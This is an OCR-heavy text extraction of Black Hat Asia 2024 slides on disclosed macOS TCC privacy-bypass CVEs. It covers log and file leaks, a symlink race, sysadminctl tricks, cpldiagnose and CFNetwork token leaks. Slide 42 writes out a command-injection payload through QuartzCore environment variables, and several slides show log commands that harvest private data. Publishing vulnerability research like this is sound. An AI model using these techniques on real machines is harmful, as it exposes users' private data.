---
title: "The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms"
speakers: ["Csaba Fitzl", "Wojciech Reguła"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Csaba Fitzl & Wojciech Reguła-The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms.pdf"
pages: 68
sha256: "7bd3c9dbe1bd9281528a4ed0721275dd3cd32a74cdf4cfaa4a5582dcd689360e"
text_chars: 26121
ocr_pages: 25
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:49:26Z"
---
# The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms

**Speakers:** Csaba Fitzl, Wojciech Reguła  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Csaba Fitzl & Wojciech Reguła-The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms.pdf` (68 pages)


## Slide 1

# THE FINAL* CHAPTER

UNLIMITED WAYS TO BYPASS YOUR MACOS PRIVACY MECHANISMS

CSABA FITZL & WOJCIECH REGUŁA

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
® ASIA ee a > | ua SS
Gen 2024 — *
THE FINAL* CHAPTER
UNLIMITED WAYS TO BYPASS YOUR MACOS PRIVACY MECHANISMS
CSABA FITZL & WOJCIECH REGULA
#BHASIA @BlackHatEvents
```

## Slide 2

##### NSFullUserName() – Wojciech Reguła

- Head of Mobile Security @ SecuRing

- Certified iOS Application Security Engineer (iASE) author

- Focused on iOS/macOS #appsec

- Blogger – https://wojciechregula.blog

# BHASIA @BlackHatEvents

## Slide 3

##### NSFullUserName() – Csaba Fitzl

- Principal macOS Security Researcher @ Kandji

- Former creator of macOS Exploitation & Pentesting Training

- Ex red/blue teamer

- 80+ CVEs from Apple

• Blog: <u>https://theevilbit.github.io/</u>

# BHASIA @BlackHatEvents

## Slide 4

## Our previous Black Hat TCC talks

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat ee Ze
ASIA 2024
Backia pifeachat
AUgUSE 4-5, 2021 EUR@GBRE ae
DECEMBER 7-Sieo-—
BRIEFINGS
of s Knockout win against TCC, a.k.a. 20+ NEW ways to
Privacy Mechanisms bypass your macOS privacy mechanisms
Csaba Fitzl, Wojciech Reguta
20+ Ways to Bypass Your macOS
Wojciech Reguta & Csaba Fitzl
```

## Slide 5

## Agenda

1. TCC / Privacy fundamentals (quick recap)

2. TCC bypasses

- Info leaks

- Sysadminctl

- com.apple.Safari.SandboxBroker

- InstallAssistant.pkg

- cpldiagnose

- QuartzCore framework

- CFNetwork

- REDACTED

3. Dead and dying techniques

4. TCC / Security improvements in macOS Sonoma

OpenAI: generate Polish and Hungarian grilling an apple

# BHASIA @BlackHatEvents

## Slide 6

# TCC / privacy fundamentals

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
TCC / privacy fundamentals
~ -
“STA - = ner
}
ry y . a
"A ~S ‘4
```

## Slide 7

## TCC / Privacy fundamentals

System Integrity Protection (SIP)

- Based on Sandbox kernel extension

- Restricts access to many directories on macOS

- Denies debugger attachments to processes signed directly by Apple

- Also known as rootless, because even root cannot do the above-mentioned operations when the SIP is turned on

# BHASIA @BlackHatEvents

## Slide 8

## TCC / Privacy fundamentals

Transparency, Consent & Control (TCC):

- Protects users’ privacy

- Not even root can approve TCC permissions

- From macOS Ventura TCC protects also containers of sandboxed apps

# BHASIA @BlackHatEvents

## Slide 9

## TCC / Privacy fundamentals

The number of protected resources still increases…

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC / Privacy fundamentals
The number of protected : : : :
resources still 2 5 : » < > < ¥
increases... f oO °
| Y Ny
Cane es
GOCE ae
```

## Slide 10

## TCC / Privacy fundamentals

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC / Privacy fundamentals
Eg Screen Time
General
@ Appearance
(G) Accessibility
Control Centre
© siri& spotiight
Desktop & Dock
es Displays
Wallpaper
Screen Saver
Battery
Qa Lock Screen
Touch ID & Password
Privacy & Security
Privacy
G4 Location Services
ay Contacts
Calendars
Reminders
& Photos
&J Bluetooth
Microphone
Camera
Homekit
Speech Recognition
provide access to documents and data in those applications, and to
3] g < Automation
Q Allow the applications below to control other applications. This will
EJ Screen Time perform actions with them.
General v Oo iTerm
Appearance
©) PP Finder
\@) Accessibility
System Events
Control Centre
ae . Hopper Disassembler
=) Siri & Spotlight
> 6 Terminal
Desktop & Dock > &. vic
es Displays
Wallpaper
Screen Saver
Battery
Qa Lock Screen
Touch ID & Password
AAA
```

## Slide 11

# TCC bypasses

# BHASIA @BlackHatEvents

## Slide 12

## TCC bypasses via info leaks

- Grepping since 2020.

- Now Apple is grepping as well. :D

- Still finding new data leaks, although not so much exposure as in the past.

- Logs are the new place to grep!

- Close to 30 leaks found. Minimum payout is 5k$. Do the math…

# BHASIA @BlackHatEvents

## Slide 13

## Notable file system info leaks

CVE-2023-23495

- ~/Library/SyncedPreferences/com.apple.kvs/com.apple.KeyValueService.EndToEndEnc rypted-Production.sqlite

- Email addresses, known wifi hotspots

CVE-2023-40395

- ~/Library/Caches/GameKit/Data/com.apple.gamecenter/en-GBG:1437723026.gcdata/database.sqlite3

- Game center cache, contact info

# BHASIA @BlackHatEvents

## Slide 14

## Notable file system info leaks

- CVE-2023-38614 - com.apple.parsecd

- Short lived session files (few mins) under ~/Library/Caches/com.apple.parsecd

- Geolocation + keylogger!!!!!

# BHASIA @BlackHatEvents

## Slide 15

## Notable log info leaks

- CVE-2023-23505 - ScreenTimeCore

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Notable log info leaks
° CVE-2023-23505 - ScreenTimeCore
@
~ % log show --predicate --last
1d
the log data using Updated com.apple.MobileSMS context for handle
info and debug messages, pass --info and/or --debug to include.
Thread Type Activity PID TTL
13:21:51.055084+0100 0x296658 Default 0x0 590 0 suggestd:
[com.apple.ScreenTimeAgent: conversation] Updated com.apple.MobileSMS context for handles: (
General policy: ©. While Limited policy: 0. allowedByScreenTime:1 applicationCurrentlyLimited:0
shouldBeAllowedByScreenTimeWhenLimited:1 emergencyModeEnabled:0 allowedByContactsHandle: {
=1;
```

## Slide 16

## Notable log info leaks

- CVE-2023-40405 – Maps – distance to location, can geolocate the user!

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Notable log info leaks
¢ CVE-2023-40405 — Maps — distance to location, can geolocate the user!
iser@ ~ % r --info --debug --process Maps -predicate “eventMessage contains[c] ‘Distance to
destination'"
"pr BEGIN TH[cd] N te | age CON to
T Type
2023-04-25 14:00:04.228534+0200 0x39c436 Fc 0x0 71081 0 I 5 )
[ A s V 5 ea ] dist to de 1 ts- 1713576
2023-04-25 14:00:05.236340+0200 0x39c494 0x0 71081 0 ps: ( € )
[ -apple. I :GE ) fe r] t > to t 11 is 15507.5
2023-04-25 14:00:26.143974+0200 0x39c436 0x0 71081 0 | A y- )
[com. F :GEOI ‘ f ] dist to 1 1 is 20605.0
2023-04-25 14:00:27.139254+0200 0x39c620 0x0 71081 0 2 (( V )
[ . ; y : Idea ] t to 1 ts -15507.5
2023-04-25 14:00:27.230583+0200 0x39c436 0x0 71081 0 5 (( > )
[ ; e. I :GE ) é der] to 1 is 20605.0
2023-04-25 14:00:27.233670+0200 0x39c436 0x0 71081 0 A es)
[ -apple. :GEOIdea s pe ] : e to « 1 is 20605.0
2023-04-25 14:00:27.234651+0200 0x39c436 0x0 71081 0 | > (Ge i )
[ 5 Hi ervices :GEOIdez I ] t to ion 1 is 20605.0
2023-04-25 14:00:27.237433+0200 0x39c436 0x0 71081 0 I 5 ; )
[ : é F ] 2 to ] 1 is 20605.0
2023
```

## Slide 17

### CVE-2023-40425 Enable private data in logs

- Most private data in the logs are filtered as <private>

- Can use a user profile to disable filtering – requires user interaction

- But! We can set this directly in preferences

# BHASIA @BlackHatEvents

## Slide 18

## TCC bypasses via info leaks

- 😂

- • **CVE-2023-32415** – open Weather && break Internet connection == profit

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via info leaks
¢ CVE-2023-32415 — open Weather && break Internet connection == profit ©
WeatherWidget (WeatherKit)
Subsystem: com.apple.weather Category: WeatherService 2023-04-07 02:03:42.689661+0200
Encountered an error when fetching weather data subset; location=<mask.hash: '4JbJ9yyCEw5831VbmMX+r. >, error=networkError(Error Domain=NSURLErrorDomain Code=-1009 "The
internet connection appears to be offline." UserInfo={_kCFStreamErrorCodeKey=5@, NSUnderlyingError=0x7fd9db21d87@ {Error Domain=kCFErrorDomainCFNetwork Code=-1009 "(null)"
UserInfo={_NSURLErrorNwPathKey=satisfiable (Network Agent [domain: NetworkExtension, type: VPN, description: VPN: NordVPN NordLynx, uuid: B8018612—7A83-4C6B-9D8F-DC8C@F565CF1,
flags: 9] is unsatisfied), interface: utun3, ipv4, dns, _kCFStreamErrorCodeKey=5@, _kCFStreamErrorDomainKey=1}}, _NSURLErrorFailingURLSessionTaskErrorKey=LocalDataTask
<1B74015D-B8CF-436F-B8@F-B58FC5F1346C>.<12>, _NSURLErrorRelatedURLSessionTaskErrorKey=(
"LocalDataTask <1B74015D-B8CF—436F—B8@F—-B58FC5F1346C>. <12>"
), NSLocalizedDescription=The internet connection appears to be offline., NSErrorFailingURLStringKey=https://weather-data.apple.com/v3/weather/en-PL/5@! /18. q
timezone=Europe/
Warsaw&dataSets=currentWeather, forecastNextHour, forecastHourly, forecastDaily weatherAlerts. airQualitv&hourlvStart=2023-94-96123:56:12Z&hour lyEnd=2023-04-077 23: 56 :12Z&country=PL&
treatmentIdentifiers=1654130767827 , 1663285968257&clientMetadata=( , NSErrorFailingURLKey=https://weather-
data.apple.com/v3/weather/en-PL/5@: 7?timezone=Europe/
Warsaw&dataSets=currentWeather, forecastNextHour, forecastHourly, forecastDaily, weatherAlerts, airQualitv&hourlyStart=2023-04-06123:56:12Z&hourlyEnd=2023-04-07T 23: 56 :12Z&country=PL&
treatmentIdentifiers=1654130767827 , 1663285968257&clientMetadata=( , _kCFStreamErrorDomainKey=1})
```

## Slide 19

## TCC bypasses via info leaks

- **CVE-2023-41072** contacts leak in iMessage

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
TCC bypasses via info leaks
see wregula — wregula@Fliger — -zsh — 96x22
log stream --debug --predicate 'process == "Messages" AND message contains "Email"' | grep \"
¢ CVE-2023-41072
contacts leak in
iMessage
```

## Slide 20

### CVE-2023-40424 TCC bypasses via sysadminctl || dscl

- We can’t change HOME directory (=TCC bypass)

- But we can create a new user with custom HOME directory with a custom TCC.db

- In Ventura user’s TCC.db was “global” (e.g.: access to Documents = all users’ Documents) è Sonoma this is per user

- Steps:

1. Create a custom TCC.db

2. Create a new user (or use root) with that DB

3. Login with the new user, access other users’ private data

4. Can be fully automated

# BHASIA @BlackHatEvents

## Slide 21

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Finder File Edit
ventura:~ root#
View
Go
Window
Help
2 Recents
Applications
=} Desktop
Documents
Downloads
csaby
iCloud Drive
csaby's Virt...
6} Parallels Tools
G8 QQ S Nov23., Wed 22:09
Documents
I bypassed TCC! Psst!
secret.txt
Plain Text Doct
Information
SS 5°90 '° @ at
```

## Slide 22

### CVE-2023-27952 TCC bypasses via Safari SandboxBroker

- /Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/ Contents/MacOS/com.apple.Safari.SandboxBroker

- Used to extract ZIP files

- Has FDA rights

# BHASIA @BlackHatEvents

## Slide 23

### CVE-2023-27952 TCC bypasses via Safari SandboxBroker

- Unzip process:

- 1.Will create a directory at `~/Downloads/[filename.zip].download` and start writing the ZIP file into this directory

- 2.Once downloaded, it will create a 6 character long random directory inside the previous one, e.g.: `~/Downloads/[filename.zip].download/abcdef`

- 3.It will extract the contents of the ZIP file into this directory

# BHASIA @BlackHatEvents

## Slide 24

### CVE-2023-27952 TCC bypasses via Safari SandboxBroker

- Exploitation process:

1. Create a large ZIP file

   - large files (slows down extraction) + custom TCC.db

2. Overwrite any ZIP file being downloaded

3. When the process creates the 6 character long directory, delete it, and place a symlink pointing to the TCC database folder.

4. Once extraction is complete, our TCC.db will be taken over.

# BHASIA @BlackHatEvents

## Slide 25

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a
System Settings
File Edit View Window
Sign in
ey Wi-Fi
GJ Bluetooth
ks) Network
Notifications
J) Sound
US Focus
&¥ Screen Time
General
@ Appearance
ey) Accessibility
Control Centre
=] Siri & Spotlight
'W Privacy & Security
Desktop & Dock
Gd Displays
Wallpaper
Help G8 QQ & Jan13., Fri 18:53
Files and Folders
Allow the applications below to access files and folders.
ia
4 Terminal
Downloads Folder
```

## Slide 26

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
‘ .
@ = Terminal
Direct
@ extzij
Shell
Edit
View Window
Help
eae Jan 13.,¥ri 18:56
Allow the applications below to access files and folders.
csaby — zip « race.py — 91x28
csaby@ventura ~ % 1s —1 Downloads/
total @
csaby@ventura ~ %
[+] cleanup
rm: /private/tmp/TCC.db: No such file or directory
rm: /private/tmp/tcc+*: No such file or directory
rm: /private/tmp/image*: No such file or directory
[+] drop TCC.db
| [+] create a few
adding:
adding:
adding:
adding:
adding:
adding:
adding:
adding:
adding:
adding:
image@
image1
image2
image3
image4
image5
imageé
image7
image8
image9
big
-ipg
-ipg
-ipg
-ipg
-ipg
-ipg
-jpg
- jpg
-ipg
-ipg
./race.py
random files
(deflated
(deflated
(deflated
(deflated
(deflated
(deflated
(deflated
(deflated
(deflated
52%)
52%)
52%)
52%)
52%)
52%)
52%)
52%)
52%)
Qng080e0e B=.
```

## Slide 27

### CVE-2023-42860 TCC (+SIP) bypasses via InstallAssistant.pkg

- Apple signed pkg è will be installed with “SIP bypass rights” because of system_installd

# BHASIA @BlackHatEvents

## Slide 28

### CVE-2023-42860 TCC (+SIP) bypasses via InstallAssistant.pkg

- Scripts inside also run with the same right

- Meet

```
link_shared_support.bash
```

• Target TCC.db or `/Library/Apple/Library/Bun dles/TCC_Compatibility.bun dle/Contents/Resources/All owApplicationsList.plist`

# BHASIA @BlackHatEvents

## Slide 29

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ Terminal Shell Edit View Window Help Q S&S ThuOct5 11:51
ee
(@) ( © moose — -zsh — 99x25
moose@max ~ %
6°88O0° 520 Gat
```

## Slide 30

## TCC bypasses via cpldiagnose

- cpldiagnose is a command line tool that diagnoses iCloud related services (mostly photos)

# BHASIA @BlackHatEvents

## Slide 31

## TCC bypasses via cpldiagnose

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via cpldiagnose
eee Macintosh HD — cpldiagnose — 124x17
users-Virtual-Machine:~ root# /System/Library/PrivateFrameworks/CloudPhotoLibrary.framework/Versions/A/Support/cpldiagnose |=
The Photos Diagnostics may contain some of your personal information, including your location, IP address, crashlogs, iCloud
account information, and photo metadata such as file names, the names of your shared photo streams, the names of people and
related information, including addresses, emails and phone numbers, from your contacts database, locations, objects and sce
nes in your photos, and calendar events associated with your photos and memories, statistics about your photo library such a
s counts and titles of photos, moments, and the age of your photos, information related to each of your memories, informatio
n about your recent or past Apple Music listening activity, the names of computers registered with your iCloud account and t
he full path names of your stored documents.
This information is used by Apple in accordance with its privacy policy (www.apple.com/privacy) and is not shared with any o
ther company. By using this tool and sending the results to Apple, you consent to Apple using the contents of these files to
improve Apple products.
Press ‘Enter' to continue. Ctrl+\ to cancel.
```

## Slide 32

## TCC bypasses via cpldiagnose

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via cpldiagnose
® user — bash — 128x28
users-Virtual-Machine:~ root# /System/Library/PrivateFrameworks/CloudPhotoLibrary.framework/Versions/A/Support/cpldiagnose —-h
Usage: cpldiagnose [-o <outputfile>] [-s] [-S] [-t] [-d|-D] [-0] [-a <annotation>] [-l <librarypath>] [-p] [-j] [-u <uid>]
gather diagnostics on cpl.
-o <outputfile>
save diagnostic to a specific file.
° skip appending auto suffix to specified diagnostic file.
i skip sysdiagnose phase.
“ time-out long operations.
* do not strip OCR data from the database
. run library preprocessing
-d/-D
skip database copying. (-d for databases bigger than 5000 MB, -D always)
-a <annotation>
annotate output file name (e.g. downloader), ignored if -o used.
-1 <librarypath>
copy information from the library at path.
—p
include legacy plists
-j
include recovery journals
-u <uid>
use <uid> as the user id
```

## Slide 33

## TCC bypasses via cpldiagnose

# BHASIA @BlackHatEvents

## Slide 34

## TCC bypasses via cpldiagnose

# BHASIA @BlackHatEvents

## Slide 35

## TCC bypasses via cpldiagnose

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via cpldiagnose
ee §& cpidiagnose — wregula@Fliger — ..C/cpidiagnose — -zsh — 84x21
> sudo ./exploit.sh
Creating cpldiagnose log...
Decompressing...
Saved locations are: (first 5)
50
50
50
54
50
Dumpin
+140
+158
+181
+185
+191
saved SMS/iMessage caller IDs: (first 5)
Photo libraries are at:
./SystemLibrary/Photos Library.photoslibrary: directory
./SyndicationLibrary/Syndication.photoslibrary: directory
```

## Slide 36

### TCC bypasses via QuartzCore framework

- QuartzCore is a standard, low-level framework built-in to macOS for processing and rendering graphical data.

- macOS’ Core Graphic is based on the Quartz drawing engine.

- Generally, it will be loaded by any native macOS app with GUI (Swift also)

# BHASIA @BlackHatEvents

## Slide 37

### TCC bypasses via QuartzCore framework

It has a large attack surface for local attacks as it handles a lot of interesting environment variables (please keep in mind that screen recording on macOS is TCC-restricted):

- CA_DEBUG_TRANSACTIONS

- CA_LOG_IMAGE_COPIES

- CA_DUMP_SURFACES_PER_DRAW

- CA_DUMP_SNAPSHOTS

- […]

- QUARTZCORE_LOG_FILE / X_LOG_FILE

- X_LOG_FILE_OPEN

# BHASIA @BlackHatEvents

## Slide 38

### TCC bypasses via QuartzCore framework

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via QuartzCore framework
r0 = geteny ;(“QUARTZCORE_LOG FILE");
if (r@ = = @x®) {
. getenv("X_LOG FILE");
if (r®@ != Ox®) {
r®@ = _x_set_log_filename(r@);
}
}
else {
r®@ = _x_set_log_filename(r@);
}
r®@ = atexit(@x1886efed@);
*0x1dScbdf50 = os_log_create( 1) imati ie r™)}
*O@x1d5cbdf68 = os_log_create( .a iat > Debug");
*O@xid5cbdf70 = os_log_create(“com.apple.cc iat a L"):
*Ox1dS5cbdf88 = os_log_create("com.apple.corea lation", "T al"):
*Ox1idScbdf98 = os_log_create( 1 - penGL");
*O@xidScbdfa8 = os_log_create( imati - nder™)s
*O@xidS5cbhdfc@ = os loa createl it . }:
```

## Slide 39

### TCC bypasses via QuartzCore framework

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via QuartzCore framework
r28 = ®xid5cc00@0;
if (getenv("X_LOG_ FILE_OPEN") != @x@) {
r28 = Oxid5cc00@0;
var_20 = 0x®@;
ar_3® = ri9;
r®@ = asprintf(&var_20, “open '%s'", r2);
if ((r® & Oxffffffff80000000) == Ox) {
r20 = O@xid5cc00e@0;
var_30 = var_20;
r@ = printf(" command: 7. seal I
r®@ = system(var_28);
r®@ = free(var_28@);
}
ri= opel
r19 = *@x1d5cced20;
}
r® = free(ri9);
*@xid5cc@d20 = @x®;
```

## Slide 40

### TCC bypasses via QuartzCore framework

This is OS command injection in all GUI macOS 😬 apps

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
TCC bypasses via QuartzCore framework
r26 = @x1d5cc00@0;
if (getenv("X_LOG_ FILE_OPEN") != @x@) {
r20 = ae
var_20 = 0x®@; 1 1
Se ce This is OS
r0 = asprintf(&var_28, “oper ro Eas
command injection
It TUro & UXT TTTTTTTOUOUUGGE) == OxBT 1
r20 = O@xid5cc00e@0;
a hago in all GUI macOS
_aA-|, of * apps ©
ro = tree(var_20);
}
ri = “opel
ri9 = Ox1d5cc0d20;
}
r® = free(ri9);
*Ox1d5cc0d20 = @x®@;
```

## Slide 41

### TCC bypasses via QuartzCore framework

- system() function will spawn a child process that will execute our command

- TCC will then check who is responsible for the child process

- 😈

- • The obvious answer here is – the parent process

# BHASIA @BlackHatEvents

## Slide 42

### TCC bypasses via QuartzCore framework

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via QuartzCore framework
@
open com. apple. findmy QUARTZCORE_LOG_FILE="/Users/wregula/Library/Caches/LocationLoggerApp.app';say pwned ';" X_LOG_FILE_OPEN=1
Process group (5)
Process execution events in the same group as say will show in this unified table.
Timestamp Process name Signing ID Process path Command line
15:01:46. @ com.apple.say /usr/bin/say say pwned ;
15:01:46. & com.apple.open /usr/bin/open open /Users/wregula/Library/Caches/LocationLoggerApp. app
15:01:46. com.apple.bash /bin/bash sh -c open '/Users/wregula/Library/Caches/LocationLoggerApp.app';say pwned ';'
15:01:46. iy com.apple.sh /bin/sh sh -c open '/Users/wregula/Library/Caches/LocationLoggerApp.app';say pwned ';'
15:01:36. {vy} com.apple.findmy /System/Appl.. /System/Applications/FindMy.app/Contents/MacOS/FindMy
```

## Slide 43

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
/bin/sh — /bin/sh — 165x27
```

## Slide 44

## TCC bypasses via CFNetwork

- It respects an environment variable CFNETWORK_DIAGNOSTICS which when set – it 😈

- makes the process logging every HTTP(S) request

# BHASIA @BlackHatEvents

## Slide 45

## TCC bypasses via CFNetwork

- CFNetwork is another widely used framework for accessing network services and for handling changes in network configurations

- Build on abstractions of network protocols to simplify tasks such as working with BSD sockets, administering HTTP and FTP servers, and managing Bonjour services

- TLDR: The CoreServices framework has CFNetwork in its dependecies

# BHASIA @BlackHatEvents

## Slide 46

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ g (user — -zsh— 100x25
-zsh
user@users-Virtual-Machine ~ % log stream --debug --predicate ‘subsystem == "com.apple.CFNetwork"'l}
|
SGOS8e8 080 °86~* F58FOR CH *U
```

## Slide 47

## TCC bypasses via CFNetwork

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
TCC bypasses via CFNetwork
12:13:26.944307+0200 Safari CFNetwork Diagnostics [3:104] 12:13:26.944 { Protocol Enqueue: request GET https://jira.
Safari (CFNetwork)
Subsystem: com.apple.CFNetwork Category: Diagnostics Details
CFNetwork Diagnostics [3:104] 12:13:26.944 {
Protocol Enqueue: request GET https://jira.! ’ apple-touch-icon.png HTTP/1.1
Request: <NSMutableURLRequest: @x6000031c38e@> { URL: https://jira. ‘apple-touch-icon.png }
Message: GET https://jira. apple-touch-icon.png HTTP/1.1
Cookie: JSESSIONID=0 ); atlassian.xsrf.token=BURB—XNU5-5UBZ-02G5_7009d31d776f4017a68de58ce308b92678360d13_lout
Accept: */x*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
} [3:104]
```

## Slide 48

## TCC bypasses via CFNetwork

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
12:03:33.867760+0200 CFNetwork Diagnostics [3:6] 12:03:33.867 { Protocol Enqueue: request GET https://weather-data.apple.com/v3/weather/en-PL/5@. (19.4 time!
Maps (CFNetwork)
Subsystem: com.apple.CFNetwork Category: Diagnostics Deta 2023-04-06 12:03:33.867760+0200
CFNetwork Diagnostics [3:6] 12:03:33.867 {
Protocol Enqueue: request GET https://weather—data.apple.com/v3/weather/en-PL/50 J (19. timezone=Europe/Warsaw&dataSets=currentWeather&country=PL HTTP/1.1
Request: <NSMutableURLRequest: @x600002969740> { URL: https://weather-data.apple.com/v3/weather/en-PL/50.038/19.954?t imezone=Europe/Warsaw&dataSets=currentWeather&country=PL }
Message: GET https://weather-data.apple.com/v3/weather/en-PL/50 /19. timezone=Europe/Warsaw&dataSets=currentWeather&country=PL HTTP/1.1
User-Agent: WeatherKit_Maps_macOS_Version 13.2.1 (Build 22D68)
Accept: */x
Authorization:
€
f :
Accept—Language: en-GB,en;
Accept-Encoding: gzip, deflate, br
} [3:6]
```

## Slide 49

## TCC bypasses via CFNetwork

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pigeachat ZA —
ASIA 2024
TCC bypasses via CFNetwork
20:22:52.271080+0200 CFNetwork Diagnostics [3:5] 20:22:52.270 { Protocol Enqueue: request POST https://p131-fmipmobi
FindMy (CFNetwork)
Subsystem: com.apple.CFNetwork Category: Diagnostics Details 2023-04-06 20:22:52.271080+0200
CFNetwork Diagnostics [3:5] 20:22:52.270 {
Protocol Enqueue: request POST https://p131-fmipmobile.icloud.com/fmipservice/device/§ /initClient HTTP/1.1
Request: <NSMutableURLRequest: @x6@0000635940> { URL: https://p131-fmipmobile.icloud.com/fmipservice/device/ L/initClient }
Message: POST https://p131-—fmipmobile.icloud.com/fmipservice/device/! /initClient HTTP/1.1
Content-Type: application/json
X-Apple-Realm-Support: 1.0
X-Apple-I-MD-LU: AB73:
Accept: application/json
Authorization: Basic
NTU@Nzc2Mjcx¢ ATBhSnJyakxYT1VVNj AxZXdaSy1qSzE@NTVha11BTmxXa@5CV1INYMTZ6QzRaNEtRZFdpc
nRrNHVuQkF1U¢ }==
X-Apple-I-MD-RINFO: 17106176
X-MME-CLIENT-INFO: <MacBookPro16,2> <mac0S;13.2.1;22D68> <com.apple.AuthKit/1 (com.apple.findmy/310.3.1)>
Accept-Encoding: gzip, deflate, br
Accept—Language: en-GB, en; q=0.9
X-Apple-I-MD-M: 8C3fQh <8DHqnsuhg/8kj
Content-Length:
X-Apple-Find-API-Ver:
```

## Slide 50

## TCC bypasses via CFNetwork

- Using the CFNetwork debug logging I was able to leak iCloud tokens

- As I proved in talk “What happens on your Mac stays on Apple’s iCloud” it is possible to drain TCC-protected sensitive entries that are synchronized with iCloud

# BHASIA @BlackHatEvents

## Slide 51

# BHASIA @BlackHatEvents

## Slide 52

## Here you should see another serious TCC bypass

#### … reported in January 2023 … which is still unfixed … which I told Apple in November I’d like to disclose at Black Hat Asia

# BHASIA @BlackHatEvents

## Slide 53

# Dead & dying techniques

# BHASIA @BlackHatEvents

## Slide 54

## Dead & dying techniques

###### **Mounting over directories**

- Most directories were protected against writing/reading, but not for mounting over

- Mostly gone

###### **Sysadmin tools**

- Many sysadmin tools had extra rights

- They were either removed or hardened

###### **Plugins**

- Launch Constraints killed most of these

- Most other app signed with hardened runtime

- Many helper tools exists (with no rights) to load 3<sup>rd</sup> party plugins

# BHASIA @BlackHatEvents

## Slide 55

## Dead & dying techniques

###### **File system & log leaks**

- FS almost doesn’t exist anymore

- Logs improve fast

- App Data protection adds another layer of protection

- **Installer script bugs**

- With “Install Script Actions & Mutations” mostly gone

# BHASIA @BlackHatEvents

## Slide 56

# TCC improvements in macOS Ventura & Sonoma

# BHASIA @BlackHatEvents

## Slide 57

### TCC improvements in macOS Sonoma/Ventura

###### **Launch Constraints (not TCC specific)**

Controls who and from where can launch an app (see: OBTS v6.0: Launch and Environment Constraints Overview), e.g.:

- Can’t copy out Apple signed apps to /tmp/ or other places…

- Can’t launch daemons from command line

# BHASIA @BlackHatEvents

## Slide 58

### TCC improvements in macOS Sonoma/Ventura

###### **Application bundle and data protection**

- Bundle protection since Ventura

- App data protection since Sonoma

- Breaks lots of info leaks

- Nice effort… too bad it’s trivial to bypass both

- **Overall 16 new TCC categories since Monterey**

# BHASIA @BlackHatEvents

## Slide 59

# Summary

# BHASIA @BlackHatEvents

## Slide 60

## Summary

- TCC is Apple’s attempt to protect private data

- Definitely a good idea

- In the past 5 years it evolved and improved a lot

- It’s getting harder to find bypasses, especially generic

- Yet, just 2 of us managed to find so many bugs that filled 3 entire conference talks – and there are a ton of others

# BHASIA @BlackHatEvents

## Slide 61

# Did we say Final chapter? Yes! It has been a great journey.

# BHASIA @BlackHatEvents

## Slide 62

# There is one more thing…

# BHASIA @BlackHatEvents

## Slide 63

# The ”Return to TCCland” Sequel is under heavy development 🤣

# BHASIA @BlackHatEvents

## Slide 64

Where We bypass AllTheThings Again… Again… And Again... 🤣

# BHASIA @BlackHatEvents

## Slide 65

# World Premier: 2025

# BHASIA @BlackHatEvents

## Slide 66

# THANK YOU!

# BHASIA @BlackHatEvents

## Slide 67

# Q&A

# BHASIA @BlackHatEvents

## Slide 68

# BHASIA @BlackHatEvents
